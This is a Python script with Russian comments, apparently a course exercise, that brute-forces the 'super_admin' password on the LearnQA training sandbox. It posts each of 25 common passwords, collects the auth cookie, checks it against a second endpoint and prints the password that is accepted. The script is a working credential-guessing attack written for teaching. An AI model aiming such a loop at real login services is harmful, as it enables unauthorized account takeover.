import requests


# Метод для отправки POST запроса и получения куки для авторизации.
def get_cookie(password):
    # Объявляем переменную содержащую корректный логин и предполагаемый пароль
    payload = {"login": "super_admin", "password": password}
    # Делаем POST запрос
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
    # Вытаскиваем куки в переменную и запоминаем ее
    cookie_value = response.cookies.get('auth_cookie')
    return cookie_value


# Метод для проверки куки
def check_cookie(cookie_value):
    # Объявляем пустую переменную с куки
    cookies = {}
    # Проверяем передали ли нам в метод куки
    if cookie_value is not None:
        # Обновляем значение в переменной куки
        cookies.update({'auth_cookie': cookie_value})
    # Делаем второй POST запрос для проверки нашего куки
    response2 = requests.post("https://playground.learnqa.ru/api/check_auth_cookie", cookies=cookies)
    # Печатаем ответ от сервера
    return response2.text


def main():
    # Список паролей для проверки
    list_of_passwords = ("123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou",
                         "111111", "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555",
                         "lovely", "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe")
    # Берем каждый пароль по порядку и подставляем
    for password in list_of_passwords:
        # Вызываем метод для получения куки с очередным паролем из списка
        cookie_value = get_cookie(password)
        # Вызываем метод для проверки корректности куки
        text_from_server = check_cookie(cookie_value)
        # Проверверяем прошла авторизация или нет
        if text_from_server == 'You are authorized':
            # Выводим пароль который подошел
            print(f"Correct password - {password}")
            break


if __name__ == "__main__":
    main()
